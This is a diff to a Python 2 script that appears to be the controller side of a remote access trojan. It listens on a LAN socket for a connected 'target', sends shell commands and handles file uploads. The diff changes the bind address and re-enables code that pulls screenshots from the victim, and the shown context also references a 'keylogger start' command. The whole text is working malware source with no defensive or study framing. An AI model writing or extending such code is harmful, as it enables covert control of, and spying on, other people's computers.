@@ -26,7 +26,7 @@ def connection_open():
 	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 	#bind the socket to an address and a port
-	s.bind(("192.168.1.246", 54321))
+	s.bind(("192.168.1.6", 54321))
 	#listening for the incoming connection
 	s.listen(5) #listen for 5 connections for example
 	print("Listening for incoming connections...")
@@ -35,7 +35,7 @@ def connection_open():
 	print("Target connected.")
 
 def commands():
-	#count = 1
+	count = 1
 	#send commands to the client
 	while True:
 		command = raw_input("* Shell#~ %s " %str(ip))
@@ -56,15 +56,15 @@ def commands():
 			except:
 				failed = "Failed to upload the file"
 				reliable_send(base64.b64encode(failed))
-		#elif command[:10] == "screenshot":
-		#	with open("screenshot%d" % count, "wb") as screen:
-		#		image = reliable_recv()
-		#		image_decoded = base64.b64decode(image)
-		#		if image_decoded[:2] == "[!":
-		#			print(image_decoded)
-		#		else:
-		#			screen.write(image_decoded)
-		#			count += 1
+		elif command[:10] == "screenshot":
+			with open("screenshot%d" % count, "wb") as screen:
+				image = reliable_recv()
+				image_decoded = base64.b64decode(image)
+				if image_decoded[:2] == "[!":
+					print(image_decoded)
+				else:
+					screen.write(image_decoded)
+					count += 1
 		elif command[:15] == "keylogger start":
 			continue
 		else:
